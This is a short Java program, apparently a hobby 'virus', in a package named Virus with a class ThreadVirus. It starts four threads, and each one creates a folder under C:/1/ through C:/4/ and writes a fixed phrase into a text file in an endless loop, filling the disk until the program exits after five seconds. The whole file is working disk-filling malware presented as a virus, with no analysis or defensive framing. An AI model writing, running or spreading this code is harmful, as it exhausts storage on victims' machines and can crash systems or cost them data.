package Virus;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

class RunnableDemo implements Runnable {

    private Thread t;
    private String threadName;
    private String Fi;

    RunnableDemo(String name, String l) {
        threadName = name;
        Fi = l;
        System.out.println("Creating " + threadName);
    }

    public void run() {
        System.out.println("Running " + threadName);
        try {
            for (int i = 12; i > 0; i--) {
                file(Integer.toString(i));
                //Thread.sleep(0);
            }
        } catch (/*Interrupted*/Exception e) {
            System.out.println("Thread " + threadName + " interrupted.");
        }
        System.out.println("Thread " + threadName + " exiting.");
    }

    public void file(String a) {
        try {
            String dir=Fi+"vir";
            System.out.println(dir);
            //new File(dir).createNewFile();
            Files.createDirectories(Paths.get(dir));
            FileWriter f = new FileWriter(dir+a+".txt", true);
            while (true) {
                f.write("Programming Is Such A FUN !!!");
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void start() {
        System.out.println("Starting " + threadName);
        if (t == null) {
            t = new Thread(this, threadName);
            t.start();
        }
    }

}

public class ThreadVirus {

    public static void main(String args[]) throws Exception {

        for(int i=1;i<=4;i++)
        {
        RunnableDemo R1 = new RunnableDemo("Thread-"+"i", "C:/"+i+"/");
        R1.start();
        }
        Thread.sleep(5000);
        System.exit(0);
   

    }
}
